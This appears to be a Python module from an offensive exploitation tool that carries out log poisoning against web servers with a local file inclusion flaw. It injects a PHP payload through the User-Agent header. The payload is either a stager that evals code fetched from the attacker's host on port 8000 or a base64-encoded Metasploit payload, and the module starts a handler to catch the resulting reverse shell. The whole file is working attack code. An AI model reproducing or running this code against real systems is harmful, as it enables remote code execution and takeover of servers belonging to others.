import subprocess
from os.path import abspath, dirname, join

from .utils import Payload, attack, colors, cook, msf_payload

STAGER = "<?php eval(file_get_contents('http://{0}:8000/{1}.php'))?>"
HERE = abspath(dirname(__file__))


class Logs:
    def __init__(self, target, location, nostager, relative, cookies):

        self.target = target
        self.location = location
        self.nostager = nostager
        self.relative = relative
        self.cookies = cookies

    def execute_logs(self):

        lhost, lport, shell = msf_payload()
        file = join(HERE, "Server.py")

        handle = Payload(lhost, lport)
        handle.handler()

        if self.nostager:
            with open("/tmp/{0}.php".format(shell), "r") as f:
                data = f.read().encode('base64').replace("\n", " ")
                payload = "<?php eval(base64_decode('{0}')); ?>".format(data)
        else:
            payload = STAGER.format(lhost, shell)

            try:
                p = subprocess.Popen(["python {}".format(file)], shell=True, stdout=subprocess.PIPE)
                p.communicate()
            except OSError as e:
                print(colors("[!] Process Error",91))
                print(e)

        input(colors("[?] Press Enter To Continue When Your Metasploit Handler is Running ...", 94))

        headers = {'User-Agent': payload}
        if self.cookies:
            f_cookies  = cook(self.cookies)
            attack(self.target, self.location, headers=headers, cookies=f_cookies)
        else:
            attack(self.target, self.location, headers=headers)